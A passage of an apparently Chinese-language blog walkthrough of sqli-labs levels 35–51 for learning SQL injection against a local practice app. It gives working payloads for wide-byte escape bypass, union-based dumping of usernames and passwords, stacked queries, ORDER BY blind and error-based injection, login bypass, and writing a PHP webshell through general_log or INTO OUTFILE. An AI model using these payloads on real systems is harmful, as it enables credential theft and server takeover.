+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><br>?id=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,(<span class="hljs-title">SELECT</span>+<span class="hljs-title">GROUP_CONCAT</span>(<span class="hljs-title">username</span>,<span class="hljs-title">password</span>+<span class="hljs-title">SEPARATOR</span>+0<span class="hljs-title">x3c62723e</span>)+<span class="hljs-title">FROM</span>+<span class="hljs-title">security</span>.<span class="hljs-title">users</span>) --+</span><br><br></code></pre></td></tr></table></figure>
+
+<h2 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p>
+<p>关键词：绕过 mysql_real_escape_string 函数</p>
+<p>mysql_real_escape_string 函数类似 addslashes 函数，会对反斜杠、单引号、双引号进行检测并添加转义字符，所以方法和 less-34 一样</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><br>?id=-<span class="hljs-number">1</span>%df<span class="hljs-string">&#x27; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+ </span><br><span class="hljs-string">?id=-1�&#x27;</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,(<span class="hljs-title">SELECT</span>+<span class="hljs-title">GROUP_CONCAT</span>(<span class="hljs-title">username</span>,<span class="hljs-title">password</span>+<span class="hljs-title">SEPARATOR</span>+0<span class="hljs-title">x3c62723e</span>)+<span class="hljs-title">FROM</span>+<span class="hljs-title">security</span>.<span class="hljs-title">users</span>) --+ </span><br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h2><p>闭合方式：<code>username=&#39;$uname&#39;</code></p>
+<p>关键词：绕过 mysql_real_escape_string 函数</p>
+<p>同上一题，GET 方法改为 POST 方法。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">uname</span>=%df&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,(SELECT GROUP_CONCAT(username,password SEPARATOR <span class="hljs-number">0</span>x<span class="hljs-number">3</span>c<span class="hljs-number">62723</span>e) FROM users)#&amp;passwd=<br><span class="hljs-attribute">uname</span>=�&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,(SELECT GROUP_CONCAT(username,password SEPARATOR <span class="hljs-number">0</span>x<span class="hljs-number">3</span>c<span class="hljs-number">62723</span>e) FROM users)#&amp;passwd=<br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="4-堆叠注入-38-53"><a href="#4-堆叠注入-38-53" class="headerlink" title="4 堆叠注入(38-53)"></a>4 堆叠注入(38-53)</h1><h2 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p>
+<p>添加字段值</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>?id=1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">users</span>(username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;hello&#x27;</span>,<span class="hljs-string">&#x27;world&#x27;</span>);<br><br></code></pre></td></tr></table></figure>
+<p>使用 SQL 语句进行查询是否添加成功</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>select * <span class="hljs-keyword">from</span> users;<br><br></code></pre></td></tr></table></figure>
+<h3 id="DNSLog-数据外带"><a href="#DNSLog-数据外带" class="headerlink" title="DNSLog 数据外带"></a>DNSLog 数据外带</h3><p>条件：</p>
+<ol>
+<li>MySQL 开启 load_file()</li>
+<li>DNSLog 平台 （Hyuga、CEYE）</li>
+<li>Windows 平台</li>
+</ol>
+<p>无 windows 暂时不测试</p>
+<h3 id="开启日志-Getshell"><a href="#开启日志-Getshell" class="headerlink" title="开启日志 Getshell"></a>开启日志 Getshell</h3><p>条件：</p>
+<ol>
+<li>Web 的物理路径</li>
+<li>MySQL 可以读写 Web 目录</li>
+<li>Windows 成功率 高于 Linux</li>
+</ol>
+<p>查看本地配置</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br>mysql&gt; show variables like <span class="hljs-emphasis">&#x27;general%&#x27;</span>;<br><span class="hljs-code">+------------------+</span>-----------------------------------------------------+<br>| Variable<span class="hljs-emphasis">_name    | Value                                               |</span><br><span class="hljs-emphasis">+------------------+-----------------------------------------------------+</span><br><span class="hljs-emphasis">| general_</span>log      | OFF                                                 |<br>| general<span class="hljs-emphasis">_log_</span>file | /Applications/MxSrvs/bin/mysql/data/MacBook-Pro.log |<br><span class="hljs-code">+------------------+</span>-----------------------------------------------------+<br>2 rows in set (0.00 sec)<br><br></code></pre></td></tr></table></figure>
+<p>默认没有开启，尝试手动开启，并配置目录路径（我的项目路径为：/Users/littlechieh6/Documents/project/sqli-labs-php7）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>?id=1&#x27;;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log = <span class="hljs-string">&quot;ON&quot;</span>;<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file=<span class="hljs-string">&#x27;/Users/littlechieh6/Documents/project/sqli-labs-php7/shell.php&#x27;</span>;<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure>
+<p>再次查看配置</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br>mysql&gt; show variables like <span class="hljs-emphasis">&#x27;general%&#x27;</span>;<br><span class="hljs-code">+------------------+</span>----------------------------------------------------------------+<br>| Variable<span class="hljs-emphasis">_name    | Value                                                          |</span><br><span class="hljs-emphasis">+------------------+----------------------------------------------------------------+</span><br><span class="hljs-emphasis">| general_</span>log      | ON                                                             |<br>| general<span class="hljs-emphasis">_log_</span>file | /Users/littlechieh6/Documents/project/sqli-labs-php7/shell.php |<br><span class="hljs-code">+------------------+</span>----------------------------------------------------------------+<br>2 rows in set (0.00 sec)<br><br></code></pre></td></tr></table></figure>
+<p>尝试 Getshell（运行的 sql 语句会被保存到我刚填写的日志路径，日志路径又在 web 路径之下，故可以得到 web shell）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;;select &#x27;</span><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span><span class="hljs-string">&#x27;;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+<p>成功获取 phpinfo 信息（同理可以写马）<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/6843E733-D786-4480-866B-5CF4A778449A.png" srcset="/img/loading.gif"></p>
+<h3 id="修改表名查数据"><a href="#修改表名查数据" class="headerlink" title="修改表名查数据"></a>修改表名查数据</h3><p>具体细节搜索：supersqli 题解（攻防世界的题目）。</p>
+<hr>
+<h2 id="less-39"><a href="#less-39" class="headerlink" title="less-39"></a>less-39</h2><p>闭合方式：<code>id=$id</code></p>
+<p>同38，闭合方式不同</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br><span class="hljs-comment"># 测试payload</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">3</span>)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-40"><a href="#less-40" class="headerlink" title="less-40"></a>less-40</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p>
+<p>同38，闭合方式不同</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br><span class="hljs-comment"># 测试</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;)<span class="hljs-comment">--+</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;) <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">3</span>)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure>
+
+
+<hr>
+<h2 id="less-41"><a href="#less-41" class="headerlink" title="less-41"></a>less-41</h2><p>闭合方式：<code>id=$id</code></p>
+<p>拼接方式和 Less-39 一样。因为少了报错输出，所以这里不能报错注入，其他注入方式一样</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br><span class="hljs-comment"># 测试</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span><span class="hljs-comment">--+</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">3</span>)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-42"><a href="#less-42" class="headerlink" title="less-42"></a>less-42</h2><p>漏洞利用点：</p>
+<ol>
+<li>login 的 password：没有过滤，可以进行报错注入</li>
+<li>堆叠注入</li>
+<li>pass_change.php：存在二次注入<br>尝试万能密码（password），post 传参数<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><br># 测试（url：http:<span class="hljs-comment">//localhost:4000/Less-42/login.php）</span><br>login_user=admin&amp;login_password=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>#&amp;mysubmit=Login<br><br># union注入<br>login_user=admin&amp;login_password=<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,(<span class="hljs-constructor">SELECT(@<span class="hljs-params">x</span>)</span><span class="hljs-constructor">FROM(SELECT(@<span class="hljs-params">x</span>:=0x00)</span> ,(<span class="hljs-constructor">SELECT(@<span class="hljs-params">x</span>)</span><span class="hljs-constructor">FROM(<span class="hljs-params">users</span>)</span><span class="hljs-constructor">WHERE(@<span class="hljs-params">x</span>)</span><span class="hljs-constructor">IN(@<span class="hljs-params">x</span>:=CONCAT(0x20,@<span class="hljs-params">x</span>,<span class="hljs-params">username</span>,<span class="hljs-params">password</span>,0x3c62723e)</span>)))x),<span class="hljs-number">3</span>#&amp;mysubmit=Login<br><br></code></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<hr>
+<h2 id="less-43"><a href="#less-43" class="headerlink" title="less-43"></a>less-43</h2><p>闭合方式：<code>username=(&#39;$username&#39;)</code></p>
+<p>和 Less-42 的利用方式一致，这里只是拼接方式不一样而已</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><br><span class="hljs-meta"># 测试（url：http:<span class="hljs-comment">//localhost:4000/Less-43/login.php）</span></span><br>login_user=admin<span class="hljs-meta">&amp;login_password=1&#x27;) or 1#</span><br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-44"><a href="#less-44" class="headerlink" title="less-44"></a>less-44</h2><p>闭合方式：<code>username=&#39;$username&#39;</code></p>
+<p>和 Less-43 的利用方式一致，因为没有输出报错信息，所以这里少了报错注入的利用方式。</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><br><span class="hljs-comment"># 测试</span><br><span class="hljs-attr">login_user</span>=admin&amp;login_password=admin<span class="hljs-string">&#x27; #</span><br><span class="hljs-string">login_user=admin&amp;login_password=admin&#x27;</span> and sleep(<span class="hljs-number">3</span>) <span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure>
+<hr>
+<h2 id="less-45"><a href="#less-45" class="headerlink" title="less-45"></a>less-45</h2><p>闭合方式：<code>username=(&#39;$username&#39;)</code></p>
+<p>和 Less-44 的利用方式一致，这里只是拼接方式不一样而已</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><br><span class="hljs-comment"># 测试</span><br><span class="hljs-attr">login_user</span>=admin&amp;login_password=admin<span class="hljs-string">&#x27;) #</span><br><span class="hljs-string">login_user=admin&amp;login_password=admin&#x27;</span>) and sleep(<span class="hljs-number">3</span>)<span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-46"><a href="#less-46" class="headerlink" title="less-46"></a>less-46</h2><p>闭合方式：<code>ORDER BY $id</code></p>
+<p>关键词：order by注入</p>
+<p>验证方式</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs perl"><br><span class="hljs-comment"># 升序排序</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> asc<br><span class="hljs-comment"># 降序排序</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> desc<br><br><span class="hljs-comment"># rand() 验证</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(true)<br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(false)<br><br><span class="hljs-comment"># 延时验证</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">sleep</span>(<span class="hljs-number">1</span>)<br>?<span class="hljs-keyword">sort</span>=(<span class="hljs-keyword">sleep</span>(<span class="hljs-number">1</span>))<br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">1</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>报错注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># 报错1</span><br>?sort=1+AND+(<span class="hljs-keyword">SELECT</span>+<span class="hljs-number">1</span>+<span class="hljs-keyword">FROM</span>+(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">COUNT</span>(*),<span class="hljs-keyword">CONCAT</span>((<span class="hljs-keyword">SELECT</span>(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">CONCAT</span>(<span class="hljs-keyword">CAST</span>(<span class="hljs-keyword">CONCAT</span>(username,<span class="hljs-keyword">password</span>)+<span class="hljs-keyword">AS</span>+<span class="hljs-built_in">CHAR</span>),<span class="hljs-number">0x7e</span>))+<span class="hljs-keyword">FROM</span>+<span class="hljs-keyword">users</span>+<span class="hljs-keyword">LIMIT</span>+<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-keyword">FLOOR</span>(<span class="hljs-keyword">RAND</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.TABLES+<span class="hljs-keyword">GROUP</span>+<span class="hljs-keyword">BY</span>+x)a)<br><br><span class="hljs-comment"># 报错2</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">procedure</span> analyse(extractvalue(<span class="hljs-keyword">rand</span>(),<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">version</span>())),<span class="hljs-number">1</span>)<br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">procedure</span> analyse(extractvalue(<span class="hljs-keyword">rand</span>(),<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">CONCAT_WS</span>(<span class="hljs-string">&#x27;:&#x27;</span>,username,<span class="hljs-keyword">password</span>)+<span class="hljs-keyword">FROM</span>+<span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))),<span class="hljs-number">1</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>布尔注入</p>
+<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><br>?<span class="hljs-built_in">sort</span>=<span class="hljs-built_in">rand</span>(left(database(),<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;r&#x27;</span>)<br>?<span class="hljs-built_in">sort</span>=<span class="hljs-built_in">rand</span>(left(database(),<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;s&#x27;</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>延时注入</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><br>?sort=rand(<span class="hljs-keyword">if</span>(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">114</span>,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">1</span>)))<br>?sort=rand(<span class="hljs-keyword">if</span>(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">115</span>,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">1</span>)))<br><br></code></pre></td></tr></table></figure>
+<p>查询结果导入文件</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;/var/www/html/less46.txt&quot;</span><br><br></code></pre></td></tr></table></figure>
+<p>导入文件写入shell</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><br>?<span class="hljs-built_in">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;/Users/littlechieh6/Documents/project/sqli-labs-php7/less46.php&quot;</span> <span class="hljs-keyword">lines</span> terminated <span class="hljs-keyword">by</span> <span class="hljs-number">0x3c3f70687020706870696e666f28293b3f3e</span><br><br></code></pre></td></tr></table></figure>
+<p>写入的内容如下</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><br><span class="xml">1 Dumb Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">2 Angelina Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">3 Dummy Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">4 secure Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">5 stupid Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">6 superman Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">7 batman Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">8 admin admin</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">9 admin1 Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">10 admin2 Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">11 admin3 Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">12 dhakkan Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">14 admin4 Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">15 admin&#x27;# admin</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">16 hello world</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-47"><a href="#less-47" class="headerlink" title="less-47"></a>less-47</h2><p>闭合方式：<code>ORDER BY &#39;$id&#39;</code></p>
+<p>和 Less-46 相比，利用方式不变，只是拼接方式方式变化，注入的时候只要正常闭合即可。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 验证</span><br><br>?<span class="hljs-attribute">sort</span>=1&#x27; <span class="hljs-keyword">or</span> sleep(3)--+<br>?<span class="hljs-attribute">sort</span>=0&#x27; <span class="hljs-keyword">or</span> sleep(3)--+<br><br></code></pre></td></tr></table></figure>
+<p>由于短路现象，前一个不会发生延时，后一个有明显的延时。</p>
+<p>报错注入</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>?sort=<span class="hljs-number">0</span>&#x27; or updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, database(), <span class="hljs-number">0x7e</span>), <span class="hljs-number">1</span>)--+<br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-48"><a href="#less-48" class="headerlink" title="less-48"></a>less-48</h2><p>闭合方式：<code>order by $id</code></p>
+<p>和 Less-47 相比少了报错注入，布尔、延时盲注依然可以正常使用，into outfile 也可以</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><br><span class="hljs-comment"># 测试：</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span>--+<br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>)--+ <span class="hljs-comment"># 无延时</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>)--+ <span class="hljs-comment"># 有延时</span><br><br></code></pre></td></tr></table></figure>
+<hr>
+<h2 id="less-49"><a href="#less-49" class="headerlink" title="less-49"></a>less-49</h2><p>闭合方式：<code>ORDER BY &#39;$id&#39;</code></p>
+<p>和 <code>Less-47</code> 相比少了报错注入，布尔、延时盲注依然可以正常使用，<code>into outfile</code> 也可以</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs perl"><br><span class="hljs-comment"># 测试</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span>        <span class="hljs-comment"># 正常排序</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span>--+     <span class="hljs-comment"># 正常排序</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>)--+ <span class="hljs-comment"># 无延时</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>)--+ <span class="hljs-comment"># 无延时</span><br><span class="hljs-comment"># 说明闭合方式不是 order by $id</span><br><br><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;        # 不正常排序</span><br><span class="hljs-string">?sort=1&#x27;</span>--+     <span class="hljs-comment"># 正常排序</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">0</span><span class="hljs-string">&#x27; or sleep(3)--+ # 有延时</span><br><span class="hljs-string">?sort=1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>)--+ <span class="hljs-comment"># 无延时</span><br><br></code></pre></td></tr></table></figure>
+<hr>
+<h2 id="less-50"><a href="#less-50" class="headerlink" title="less-50"></a>less-50</h2><p>闭合方式：<code>ORDER BY $id</code></p>
+<p>和 Less-46 相比，查询方式由 mysql_query 变成了 mysqli_multi_query，因此支持堆叠注入，在注入方面会更加灵活。</p>
+<p>关键代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>$sql=<span class="hljs-string">&quot;SELECT * FROM users ORDER BY <span class="hljs-subst">$id</span>&quot;</span>;<br><span class="hljs-comment"># 堆叠注入 </span><br>mysqli_multi_query($con1, $sql)<br><span class="hljs-comment"># 打印错误</span><br>print_r(mysqli_error($con1));<br><br></code></pre></td></tr></table></figure>
+<p>尝试注入</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><br># 测试<br>?sort=<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, database(), <span class="hljs-number">0x7e</span>), <span class="hljs-number">1</span>)--+ <br># XPATH syntax error: <span class="hljs-string">&#x27;~security~&#x27;</span><br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-51"><a href="#less-51" class="headerlink" title="less-51"></a>less-51</h2><p>闭合方式：<code>ORDER BY &#39;$id&#39;</code></p>
+<p>和 Less-50 相比只是拼接方式发生了变化，实际注入的时候只需做一下对应的闭合即可。</p>
